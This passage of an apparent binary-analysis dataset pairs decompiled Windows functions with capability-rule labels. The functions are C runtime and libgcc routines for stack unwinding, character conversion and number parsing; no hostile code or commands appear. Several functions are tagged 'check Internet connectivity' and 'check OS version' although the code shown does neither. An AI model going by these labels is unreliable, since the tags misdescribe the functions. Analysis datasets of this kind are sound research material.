*puVar19;\n                                        uVar11 = uVar15;\n                                        uVar15 = uVar15 + 7;\n                                        uVar22 = uVar22 | (uVar12 & 0x7f) << (uVar11 & 0x1f);\n                                        puVar19 = puVar9;\n                                    } while (uVar12 < '\\0');\n                                    if ((uVar15 < 0x20) && ((uVar12 & 0x40) != 0)) {\n                                        uVar22 = uVar22 | -(1 << (uVar15 & 0x1f));\n                                    }\n                                    if (0x11 < uVar14) goto code_r0x004014e0;\n                                    puVar10 = *(extraout_ECX + uVar14 * 4);\n                                    if (((*(extraout_ECX + 99) & 0x40) == 0) ||\n                                       (*(extraout_ECX + 0x6c + uVar14) == '\\0')) {\n                                        if (*(uVar14 + 0x56b3f4) != '\\x04') goto code_r0x004014e0;\n                                        puVar10 = *puVar10;\n                                    }\n                                    param_2 = uVar22 + puVar10;\n                                    break;\n                                case 0x93:\n                                    goto code_r0x004395a4;\n                                case 0xee:\n                                    fcn.00438670();\n                                    puVar9 = fcn.00438530(&stack0xfffffe84);\n                                    param_2 = ppiStack380;\n                                }\ncode_r0x00439590:\n                                if (0x3f < ppiStack404) goto code_r0x004014e0;\n                                *(&stack0xfffffe88 + ppiStack404 * 4) = param_2;\n                                ppiVar20 = ppiStack404;\n                                ppiStack404 = ppiStack404 + 1;\ncode_r0x004395a4:\n                                puVar19 = puVar9;\n                            } while (puVar9 < puVar16);\n                            if (ppiStack404 == NULL) {\ncode_r0x004014e0:\n                                sub.msvcrt.dll_abort();\n                                sub.msvcrt.dll_abort();\n                                sub.msvcrt.dll_abort();\n                                sub.msvcrt.dll_abort();\n                                sub.msvcrt.dll_abort();\n                                sub.msvcrt.dll_abort();\n                                sub.msvcrt.dll_abort();\n                                sub.msvcrt.dll_abort();\n                                sub.msvcrt.dll_abort();\n                                sub.msvcrt.dll_abort();\n                                sub.msvcrt.dll_abort();\n                                sub.msvcrt.dll_abort();\n                                sub.msvcrt.dll_abort();\n                                sub.msvcrt.dll_abort();\n                                iVar13 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n                                if (iVar13 == 0) {\n                                    *0x4ce004 = 0x43c000;\n                                    pcVar6 = 0x43bdb0;\n                                }\n                                else {\n                                    *0x56bdf0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n                                    pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n                                    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar13, \"__register_frame_info\");\n                                    *0x4ce004 = (*pcVar4)(iVar13, \"__deregister_frame_info\");\n                                }\n                                if (pcVar6 != NULL) {\n                                    (*pcVar6)(0x52e0f8, 0x56b01c);\n                                }\n                                iVar13 = fcn.004014c0(fcn.00401590);\n                                return iVar13;\n                            }\n                            iStack88 = *(&stack0xfffffe84 + ppiStack404 * 4);\n                        }\n                        return iStack88;\n                    }\n                }\n                else if (uVar12 != 3) {\n                    if (uVar12 != 4) goto code_r0x00439528;\n                    iVar13 = 0x18;\n                    goto code_r0x0043919e;\n                }\n                iVar13 = 0x10;\n            }\n        }\ncode_r0x0043919e:\n        pcVar18 = iVar13 + iStack60;\n        if (*(param_2 + 0xba) != '\\0') {\n            do {\n                cVar5 = *pcVar18;\n                pcVar18 = pcVar18 + 1;\n            } while (cVar5 < '\\0');\n        }\n        if (*(param_2 + 0xb9) != -1) {\n            ppiStack96 = 0x439228;\n            fcn.00438670();\n            ppiStack92 = &stack0xffffffe0;\n            ppiStack96 = 0x43923a;\n            fcn.00438530();\n            *(iStack64 + 0x50) = piStack32;\n        }\n        ppiStack96 = 0x439201;\n        ppiStack92 = param_2;\n        fcn.004386b0();\n        return 0;\n    }\n    pcVar18 = *(iStack64 + 0x4c);\n    piVar21 = *(iStack64 + 0x48);\n    if ((((pcVar18[-2] != -1) || (pcVar18[-1] != -0x30)) || (*pcVar18 != -0x7d)) || (pcVar18[1] != -8)) {\n        if (pcVar18[-5] != -0x18) {\n            if (((pcVar18[-5] != -0x75) || (pcVar18[-4] != 'M')) || (*pcVar18 != 'd')) {\ncode_r0x00439286:\n                if (((((pcVar18[-1] == -0x7d) && (*pcVar18 == '\\t')) && (pcVar18[1] == '\\0')) &&\n                    ((pcVar18[2] == '-' && (pcVar18[3] == '\\0')))) && ((pcVar18[4] == '\\x10' && (pcVar18[5] == '\\0'))))\n                {\n                    param_2[0x28] = 0x1;\n                    param_2[0x26] = 0x4;\n                    param_2[0x25] = 0x4;\n                    param_2[3] = 0x1;\n                    param_2[2] = 0xfffffffc;\n                    param_2[0x2d] = 0x8;\n                    param_2[0x11] = 0x1;\n                    param_2[0x10] = NULL;\n                    *(param_2 + 0xbb) = 1;\n                    return 0;\n                }\n                return 5;\n            }\n            if (pcVar18[1] != -0x75) {\n                return 5;\n            }\n            iVar13 = piVar21[2];\n            goto code_r0x00439370;\n        }\n        if ((pcVar18[-4] != 'h') || (*pcVar18 != -0x3d)) {\n            if (*pcVar18 != -0x7d) goto code_r0x00439286;\n            if (pcVar18[1] != -0x3c) {\n                return 5;\n            }\n            if (pcVar18[3] != -0x48) {\n                return 5;\n            }\n            iVar13 = piVar21[0xe];\n            goto code_r0x00439370;\n        }\n    }\n    iVar13 = *(*piVar21 + 4);\ncode_r0x00439370:\n    iVar7 = *(iVar13 + 0xc4);\n    param_2[1] = 0x1;\n    param_2[0x28] = 0x1;\n    param_2[7] = 0x1;\n    param_2[0x26] = 0x4;\n    param_2[0x25] = iVar7 - piVar21;\n    *param_2 = (iVar13 + 0xb0) - iVar7;\n    param_2[3] = 0x1;\n    param_2[6] = (iVar13 + 0xa4) - iVar7;\n    param_2[5] = 0x1;\n    param_2[2] = (iVar13 + 0xac) - iVar7;\n    param_2[0xd] = 0x1;\n    param_2[4] = (iVar13 + 0xa8) - iVar7;\n    param_2[0xf] = 0x1;\n    param_2[0xc] = (iVar13 + 0xa0) - iVar7;\n    param_2[0xb] = 0x1;\n    param_2[0xe] = (iVar13 + 0x9c) - iVar7;\n    param_2[0x11] = 0x1;\n    param_2[0x10] = (iVar13 + 0xb8) - iVar7;\n    param_2[10] = (iVar13 + 0xb4) - iVar7;\n    param_2[0x2d] = 0x8;\n    *(param_2 + 0xbb) = 1;\n    return 0;\n}\n",
        "token_count": 8594
    },
    "00439bb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00439bb0(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint *in_EAX;\n    char *pcVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint extraout_ECX;\n    uint *puVar8;\n    ulong uVar9;\n    uint auStack428 [38];\n    uint uStack276;\n    uint uStack272;\n    uint uStack264;\n    uint uStack204;\n    int32_t iStack176;\n    uint uStack160;\n    uint auStack156 [4];\n    uint *puStack140;\n    uint32_t uStack60;\n    char acStack48 [4];\n    char cStack44;\n    \n    puVar7 = in_EAX;\n    puVar8 = auStack156;\n    for (iVar6 = 0x20; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    if ((((uStack60 & 0x40000000) == 0) || (cStack44 == '\\0')) && (puStack140 == NULL)) {\n        if (*0x56b3f8 == '\\x04') {\n            if ((uStack60 & 0x40000000) != 0) {\n                cStack44 = '\\0';\n            }\n            puStack140 = &uStack160;\n            uStack160 = in_EAX[0x12];\n            goto code_r0x00439bf2;\n        }\n    }\n    else {\ncode_r0x00439bf2:\n        if ((*(in_EAX + 99) & 0x40) != 0) {\n            *(in_EAX + 0x1c) = 0;\n        }\n        in_EAX[4] = 0;\n        if (*(param_2 + 0xa0) != 1) {\n            if (*(param_2 + 0xa0) == 2) {\n                pcVar4 = *(param_2 + 0x9c);\n                do {\n                    cVar1 = *pcVar4;\n                    pcVar4 = pcVar4 + 1;\n                } while (cVar1 < '\\0');\n                iStack176 = fcn.00439530();\n                goto code_r0x00439ca1;\n            }\n            uVar9 = sub.msvcrt.dll_abort();\n            auStack428[0] = uVar9 >> 0x20;\n            puVar8 = uVar9;\n            puVar7 = puVar8;\n            for (iVar6 = 0x20; iVar6 != 0; iVar6 = iVar6 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            puVar8[0x18] = 0x40000000;\n            puVar8[0x13] = uStack204;\n            iVar6 = fcn.00438f10();\n            pcVar3 = _sym.imp.KERNEL32.dll_Sleep;\n            if (iVar6 == 0) {\n                if (*0x515a34 == 0) {\n                    if (*0x56b3f4 == '\\0') {\n                        *0x56b3f4 = '\\x04';\n                        *0x56b3f6 = 4;\n                        *0x56b3f5 = 4;\n                        *0x56b3f7 = 4;\n                        *0x56b3fa = 4;\n                        *0x56b3fb = 4;\n                        *0x56b3f9 = 4;\n                        *0x56b3f8 = '\\x04';\n                        *0x56b3ff = 0xc;\n                        *0x56b400 = 0xc;\n                        *0x56b401 = 0xc;\n                        *0x56b402 = 0xc;\n                        *0x56b403 = 0xc;\n                        *0x56b404 = 0xc;\n                        *0x56b3fd = 4;\n                        *0x56b3fc = 4;\n                    }\n                }\n                else if (*0x515a38 == 0) {\n                    LOCK();\n                    *0x515a3c = *0x515a3c + 1;\n                    if (*0x515a3c == 0) {\n                        *0x56b3f4 = '\\x04';\n                        *0x56b3f6 = 4;\n                        *0x56b3f5 = 4;\n                        *0x56b3f7 = 4;\n                        *0x56b3fa = 4;\n                        *0x56b3fb = 4;\n                        *0x56b3f9 = 4;\n                        *0x56b3f8 = '\\x04';\n                        *0x56b3ff = 0xc;\n                        *0x56b400 = 0xc;\n                        *0x56b401 = 0xc;\n                        *0x56b402 = 0xc;\n                        *0x56b403 = 0xc;\n                        *0x56b404 = 0xc;\n                        *0x56b3fd = 4;\n                        *0x56b3fc = 4;\n                        *0x515a38 = 1;\n                    }\n                    else {\n                        do {\n                            (*pcVar3)(0);\n                        } while (*0x515a38 == 0);\n                    }\n                }\n                if (*0x56b3f8 == '\\x04') {\n                    if ((*(puVar8 + 99) & 0x40) != 0) {\n                        *(puVar8 + 0x1c) = 0;\n                    }\n                    uStack264 = 1;\n                    puVar8[4] = auStack428;\n                    uStack272 = 4;\n                    uStack276 = 0;\n                    fcn.00439bb0();\n                    puVar8[0x13] = extraout_ECX;\n                    return;\n                }\n            }\n            goto code_r0x004014e0;\n        }\n        iVar6 = *(param_2 + 0x98);\n        if (iVar6 < 0x12) {\n            puVar7 = auStack156[iVar6];\n            if (((uStack60 & 0x40000000) == 0) || (acStack48[iVar6] == '\\0')) {\n                if (*(iVar6 + 0x56b3f4) != '\\x04') goto code_r0x004c56ab;\n                puVar7 = *puVar7;\n            }\n            iStack176 = puVar7 + *(param_2 + 0x94);\ncode_r0x00439ca1:\n            iVar6 = 0;\n            in_EAX[0x12] = iStack176;\n            do {\n                if (*(param_2 + 4 + iVar6 * 8) < 6) {\n    // WARNING: Could not recover jumptable at 0x00439cbb. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (6 cases) at 0x5271c0\n                    (**(*(param_2 + 4 + iVar6 * 8) * 4 + 0x5271c0))();\n                    return;\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 != 0x12);\n            uVar5 = in_EAX[0x18] & 0x7fffffff;\n            if (*(param_2 + 0xbb) != '\\0') {\n                uVar5 = in_EAX[0x18] | 0x80000000;\n            }\n            in_EAX[0x18] = uVar5;\n            return;\n        }\n    }\ncode_r0x004c56ab:\n    sub.msvcrt.dll_abort();\ncode_r0x004014e0:\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    iVar6 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n    if (iVar6 == 0) {\n        *0x4ce004 = 0x43c000;\n        pcVar3 = 0x43bdb0;\n    }\n    else {\n        *0x56bdf0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar6, \"__register_frame_info\");\n        *0x4ce004 = (*pcVar2)(iVar6, \"__deregister_frame_info\");\n    }\n    if (pcVar3 != NULL) {\n        (*pcVar3)(0x52e0f8, 0x56b01c);\n    }\n    fcn.004014c0(fcn.00401590);\n    return;\n}\n",
        "token_count": 2096
    },
    "0043a2f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043a2f0(uint param_1, int32_t param_2)\n\n{\n    uint8_t uVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t in_EAX;\n    uint32_t uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    uint auStack32 [4];\n    \n    if ((((*(param_2 + 0x60) & 0x40000000) == 0) || (*(param_2 + 0x70) == '\\0')) && (*(param_2 + 0x10) == 0)) {\n        if (*0x56b3f8 != '\\x04') goto code_r0x004014e0;\n        if ((*(param_2 + 0x60) & 0x40000000) != 0) {\n            *(param_2 + 0x70) = 0;\n        }\n        *(param_2 + 0x10) = auStack32;\n        auStack32[0] = *(param_2 + 0x48);\n    }\n    iVar7 = 0;\n    do {\n        while( true ) {\n            puVar5 = *(in_EAX + iVar7 * 4);\n            puVar8 = *(param_2 + iVar7 * 4);\n            if (*(in_EAX + 0x6c + iVar7) != '\\0') goto code_r0x004014e0;\n            if (*(param_2 + 0x6c + iVar7) == '\\0') break;\n            if (puVar5 != NULL) {\n                if (*(iVar7 + 0x56b3f4) != '\\x04') goto code_r0x004014e0;\n                *puVar5 = puVar8;\n            }\ncode_r0x0043a333:\n            iVar7 = iVar7 + 1;\n            if (iVar7 == 0x11) goto code_r0x0043a3d0;\n        }\n        if ((puVar5 == NULL || puVar8 == NULL) || (puVar5 == puVar8)) goto code_r0x0043a333;\n        uVar1 = *(iVar7 + 0x56b3f4);\n        uVar4 = uVar1;\n        if (uVar4 < 4) {\n            if ((uVar4 != 0) && (*puVar5 = *puVar8,  (uVar1 & 2) != 0)) {\n                *(puVar5 + (uVar4 - 2)) = *(puVar8 + (uVar4 - 2));\n            }\n            goto code_r0x0043a333;\n        }\n        iVar7 = iVar7 + 1;\n        *puVar5 = *puVar8;\n        *(puVar5 + (uVar4 - 4)) = *(puVar8 + (uVar4 - 4));\n        iVar6 = puVar5 - (puVar5 + 1 & 0xfffffffc);\n        puVar8 = puVar8 - iVar6;\n        puVar5 = puVar5 + 1 & 0xfffffffc;\n        for (uVar4 = iVar6 + uVar4 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar5 = *puVar8;\n            puVar8 = puVar8 + 1;\n            puVar5 = puVar5 + 1;\n        }\n    } while (iVar7 != 0x11);\ncode_r0x0043a3d0:\n    iVar7 = 0;\n    if (((*(in_EAX + 99) & 0x40) != 0) && (*(in_EAX + 0x70) != '\\0')) {\n        return iVar7;\n    }\n    if (*(in_EAX + 0x10) == 0) {\n        puVar5 = *(param_2 + 0x10);\n        if (((*(param_2 + 99) & 0x40) == 0) || (*(param_2 + 0x70) == '\\0')) {\n            if (*0x56b3f8 != '\\x04') {\ncode_r0x004014e0:\n                sub.msvcrt.dll_abort();\n                sub.msvcrt.dll_abort();\n                sub.msvcrt.dll_abort();\n                sub.msvcrt.dll_abort();\n                sub.msvcrt.dll_abort();\n                sub.msvcrt.dll_abort();\n                sub.msvcrt.dll_abort();\n                sub.msvcrt.dll_abort();\n                sub.msvcrt.dll_abort();\n                iVar7 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n                if (iVar7 == 0) {\n                    *0x4ce004 = 0x43c000;\n                    pcVar3 = 0x43bdb0;\n                }\n                else {\n                    *0x56bdf0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n                    pcVar2 = _sym.imp.KERNEL32.dll_GetProcAddress;\n                    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar7, \"__register_frame_info\");\n                    *0x4ce004 = (*pcVar2)(iVar7, \"__deregister_frame_info\");\n                }\n                if (pcVar3 != NULL) {\n                    (*pcVar3)(0x52e0f8, 0x56b01c);\n                }\n                iVar7 = fcn.004014c0(fcn.00401590);\n                return iVar7;\n            }\n            puVar5 = *puVar5;\n        }\n        iVar7 = puVar5 + (*(param_2 + 0x68) - *(in_EAX + 0x48));\n    }\n    return iVar7;\n}\n",
        "token_count": 1292
    },
    "0043aed0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nchar fcn.0043aed0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char cVar4;\n    char *pcVar5;\n    uchar auStack16 [8];\n    \n    iVar1 = sub.msvcrt.dll_strlen(in_EAX + 9);\n    pcVar2 = in_EAX + 10 + iVar1;\n    if (3 < *(in_EAX + 8)) {\n        if (*pcVar2 != '\\x04') {\n            return -1;\n        }\n        if (pcVar2[1] != '\\0') {\n            return -1;\n        }\n        pcVar2 = pcVar2 + 2;\n    }\n    if (*(in_EAX + 9) != 'z') {\n        return '\\0';\n    }\n    do {\n        pcVar5 = pcVar2 + 1;\n        if (-1 < *pcVar2) break;\n        pcVar3 = pcVar2 + 1;\n        pcVar5 = pcVar2 + 2;\n        pcVar2 = pcVar2 + 2;\n    } while (*pcVar3 < '\\0');\n    do {\n        pcVar2 = pcVar5;\n        pcVar5 = pcVar2 + 1;\n    } while (*pcVar2 < '\\0');\n    if (*(in_EAX + 8) == 1) {\n        pcVar2 = pcVar2 + 2;\n    }\n    else {\n        do {\n            pcVar2 = pcVar5 + 1;\n            cVar4 = *pcVar5;\n            pcVar5 = pcVar2;\n        } while (cVar4 < '\\0');\n    }\n    pcVar5 = in_EAX + 10;\n    do {\n        pcVar3 = pcVar2 + 1;\n        cVar4 = *pcVar2;\n        pcVar2 = pcVar3;\n    } while (cVar4 < '\\0');\n    cVar4 = *(in_EAX + 10);\n    while (cVar4 != 'R') {\n        while (cVar4 != 'P') {\n            if (cVar4 != 'L') {\n                return '\\0';\n            }\n            pcVar5 = pcVar5 + 1;\n            cVar4 = *pcVar5;\n            pcVar3 = pcVar3 + 1;\n            if (cVar4 == 'R') goto code_r0x0043af86;\n        }\n        pcVar5 = pcVar5 + 1;\n        pcVar3 = fcn.0043ad20(auStack16);\n        cVar4 = *pcVar5;\n    }\ncode_r0x0043af86:\n    return *pcVar3;\n}\n",
        "token_count": 597
    },
    "0043c8f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0043c8f0(uint16_t *param_1, uint32_t *param_2, uint32_t param_3, uint32_t *param_4, int32_t param_5, \n                 uint32_t param_6)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t auStack16 [2];\n    \n    if (param_2 == NULL) {\n        return 0;\n    }\n    if (param_3 == 0) {\n        return 0xfffffffe;\n    }\n    uVar1 = *param_2;\n    auStack16[0] = *param_4;\n    *param_4 = 0;\n    if (uVar1 == 0) {\n        *param_1 = 0;\n        return 0;\n    }\n    if (param_6 < 2) {\ncode_r0x0043c9b2:\n        if (param_5 == 0) {\n            *param_1 = *param_2;\n            return 1;\n        }\n        iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(param_5, 8, param_2, 1, param_1, 1);\n        if (iVar2 != 0) {\n            return 1;\n        }\n    }\n    else {\n        if (auStack16[0] == '\\0') {\n            iVar2 = (*_sym.imp.KERNEL32.dll_IsDBCSLeadByteEx)(param_5, uVar1);\n            if (iVar2 == 0) goto code_r0x0043c9b2;\n            if (param_3 < 2) {\n                *param_4 = *param_2;\n                return 0xfffffffe;\n            }\n        }\n        else {\n            auStack16[0]._0_2_ = CONCAT11(uVar1, auStack16[0]);\n            auStack16[0] = auStack16[0] & 0xffff0000 | auStack16[0];\n            param_2 = auStack16;\n        }\n        iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(param_5, 8, param_2, 2, param_1, 1);\n        if (iVar2 != 0) {\n            return 2;\n        }\n    }\n    puVar3 = sub.msvcrt.dll__errno();\n    *puVar3 = 0x2a;\n    return 0xffffffff;\n}\n",
        "token_count": 562
    },
    "0043cc40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint8_t * __cdecl fcn.0043cc40(uint8_t *arg_8h, float10 *arg_ch)\n\n{\n    float10 fVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint16_t uVar4;\n    uint8_t **ppuVar5;\n    int32_t iVar6;\n    uint8_t *puVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint32_t uVar10;\n    uint8_t *puVar11;\n    uint8_t *puVar12;\n    uint *puVar13;\n    uint16_t uVar14;\n    uint32_t uVar15;\n    uint16_t *apuStack192 [2];\n    float10 *pfStack184;\n    uint16_t *puStack180;\n    uint32_t auStack176 [6];\n    uint32_t var_94h;\n    uint *var_90h;\n    int32_t var_8ch;\n    uint32_t var_88h;\n    int32_t var_84h;\n    uint32_t var_80h;\n    uint32_t var_7ch;\n    uint32_t var_78h;\n    ushort var_72h;\n    uint32_t var_70h;\n    uint32_t var_6ch;\n    uint8_t *var_68h;\n    uint *var_64h;\n    int32_t var_60h;\n    uint8_t *var_5ch;\n    uint var_4eh;\n    uint var_4ah;\n    uint var_46h;\n    uint var_42h;\n    uint var_3eh;\n    int32_t var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint16_t var_28h;\n    uint var_ch;\n    \n    apuStack192[0] = 0x43cc54;\n    ppuVar5 = sub.msvcrt.dll_localeconv();\n    apuStack192[1] = arg_8h;\n    var_70h = var_70h & 0xffffff00 | **ppuVar5;\n    apuStack192[0] = 0x43cc64;\n    iVar6 = sub.msvcrt.dll_strlen();\n    var_5ch = iVar6 + 2;\n    apuStack192[0] = 0x43cc75;\n    iVar6 = fcn.00437ed0();\n    iVar6 = -iVar6;\n    var_68h = &fcn.0043cc40::var_94h + iVar6 + 3 & 0xfffffff0;\n    puVar7 = arg_8h;\n    while( true ) {\n        var_60h = puVar7 - arg_8h;\n        uVar3 = *puVar7;\n        *(&stack0xffffff44 + iVar6) = uVar3;\n        *(&stack0xffffff40 + iVar6) = 0x43cc9c;\n        var_84h = sub.msvcrt.dll_isspace();\n        if (var_84h == 0) break;\n        puVar7 = puVar7 + 1;\n    }\n    puVar12 = var_68h;\n    if (0 < var_5ch) {\n        *var_68h = uVar3;\n        puVar12 = var_68h + 1;\n        if (uVar3 != 0) {\n            var_5ch = puVar7 + var_5ch;\n            puVar11 = var_68h + 1;\n            do {\n                puVar7 = puVar7 + 1;\n                puVar12 = puVar11;\n                if (puVar7 == var_5ch) break;\n                uVar3 = *puVar7;\n                *puVar11 = uVar3;\n                puVar12 = puVar11 + 1;\n                puVar11 = puVar11 + 1;\n            } while (uVar3 != 0);\n        }\n    }\n    *puVar12 = 0;\n    if (*var_68h == 0x2d) {\n        var_72h = 0xffff;\n        var_5ch = var_68h + 1;\n    }\n    else {\n        var_72h = 0;\n        var_5ch = var_68h;\n        if (*var_68h == 0x2b) {\n            var_5ch = var_68h + 1;\n        }\n    }\n    puVar12 = var_5ch;\n    *(&stack0xffffff4c + iVar6) = 3;\n    *(&stack0xffffff44 + iVar6) = 0x527260;\n    *(&stack0xffffff48 + iVar6) = puVar12;\n    *(&stack0xffffff40 + iVar6) = 0x43cd1b;\n    iVar8 = sub.msvcrt.dll__strnicmp();\n    puVar7 = var_5ch;\n    if (iVar8 == 0) {\n        *(&stack0xffffff4c + iVar6) = 5;\n        *(&stack0xffffff44 + iVar6) = \"INITY\";\n        *(&stack0xffffff48 + iVar6) = puVar12 + 3;\n        *(&stack0xffffff40 + iVar6) = 0x43cd3f;\n        iVar8 = sub.msvcrt.dll__strnicmp();\n        var_4ah._0_2_ = 0;\n        var_4ah._2_2_ = 0;\n        var_46h._0_2_ = 0;\n        var_46h._2_2_ = 0;\n        puVar7 = puVar12 + 3;\n        if (iVar8 == 0) {\n            puVar7 = puVar12 + 8;\n        }\n        *(&stack0xffffff44 + iVar6) = &fcn.0043cc40::var_4eh;\n        var_3eh._0_2_ = 0;\n        var_42h._0_2_ = 0;\n        var_42h._2_2_ = 0;\n        var_4eh._2_2_ = 0x7fff;\n        var_4eh._0_2_ = var_72h;\n        *(&stack0xffffff48 + iVar6) = arg_ch;\n        *(&stack0xffffff40 + iVar6) = 0x43cd80;\n        fcn.004408e0();\n        var_5ch = puVar7;\n        goto code_r0x0043cd80;\n    }\n    *(&stack0xffffff4c + iVar6) = 3;\n    *(&stack0xffffff44 + iVar6) = 0x52726a;\n    *(&stack0xffffff48 + iVar6) = puVar7;\n    *(&stack0xffffff40 + iVar6) = 0x43cdaf;\n    iVar8 = sub.msvcrt.dll__strnicmp();\n    if (iVar8 == 0) {\n        puVar7 = puVar7 + 3;\n        var_4eh._2_2_ = 0x7fff;\n        var_4ah._0_2_ = 0;\n        var_4ah._2_2_ = 0xc000;\n        var_46h._0_2_ = 0;\n        var_46h._2_2_ = 0;\n        var_42h._0_2_ = 0;\n        var_42h._2_2_ = 0;\n        var_3eh._0_2_ = 0;\ncode_r0x0043cdd2:\n        var_42h._2_2_ = 0;\n        var_42h._0_2_ = 0;\n        var_46h._2_2_ = 0;\n        var_46h._0_2_ = 0;\n        var_4ah._0_2_ = 0;\n        var_3eh._0_2_ = 0;\n        var_4eh._0_2_ = var_72h;\n        *(&stack0xffffff48 + iVar6) = arg_ch;\n        *(&stack0xffffff44 + iVar6) = &fcn.0043cc40::var_4eh;\n        *(&stack0xffffff40 + iVar6) = 0x43cdec;\n        fcn.004408e0();\n        var_5ch = puVar7;\n        goto code_r0x0043cd80;\n    }\n    var_4eh._0_2_ = 0;\n    var_4eh._2_2_ = 0;\n    var_4ah._0_2_ = 0;\n    var_4ah._2_2_ = 0;\n    var_46h._0_2_ = 0;\n    var_46h._2_2_ = 0;\n    var_42h._0_2_ = 0;\n    var_42h._2_2_ = 0;\n    var_3eh._0_2_ = 0;\n    uVar3 = *var_5ch;\n    if (uVar3 == 0x30) {\n        do {\n            var_5ch = var_5ch + 1;\n            uVar3 = *var_5ch;\n        } while (uVar3 == 0x30);\n        var_94h = 1;\n    }\n    else {\n        var_94h = 0;\n    }\n    var_80h = 0;\n    var_78h = 0;\n    var_88h = 0;\n    var_7ch = 0;\n    var_6ch = 0;\ncode_r0x0043ceae:\n    var_64h = uVar3 - 0x30;\n    if (var_64h < 0xa) {\n        if (var_4ah == 0) {\n            var_7ch = (var_7ch + 1) - (var_6ch == 0);\n            uVar15 = 0;\n            puVar9 = &fcn.0043cc40::var_3eh;\n            do {\n                if (*puVar9 < 0) {\n                    uVar15 = uVar15 | 1;\n                }\n                uVar14 = *puVar9 * 2;\n                if ((uVar15 & 2) != 0) {\n                    uVar14 = uVar14 | 1;\n                }\n                puVar13 = puVar9 + -2;\n                uVar15 = uVar15 * 2;\n                *puVar9 = uVar14;\n                puVar9 = puVar13;\n            } while (puVar13 != &fcn.0043cc40::var_4eh + 2);\n            iVar8 = &fcn.0043cc40::var_3eh + 2;\n            var_2ch._0_2_ = 0;\n            uVar15 = 0;\n            var_8ch = iVar8;\n            var_90h = &fcn.0043cc40::var_2ch;\n            stack0xffffffc0 = CONCAT22(var_4eh._2_2_, var_4eh);\n            var_38h = var_4ah._2_2_ << 0x10;\n            var_34h = CONCAT22(var_46h._2_2_, var_46h);\n            var_30h = CONCAT22(var_42h._2_2_, var_42h);\n            uVar14 = 0;\n            puVar9 = &fcn.0043cc40::var_2ch;\n            while( true ) {\n                if (uVar14 < 0) {\n                    uVar15 = uVar15 | 1;\n                }\n                uVar4 = uVar14 * 2;\n                if ((uVar15 & 2) != 0) {\n                    uVar4 = uVar14 * 2 | 1;\n                }\n                puVar13 = puVar9 + -2;\n                uVar15 = uVar15 * 2;\n                *puVar9 = uVar4;\n                puVar9 = var_90h;\n                uVar14 = var_4ah;\n                if (puVar13 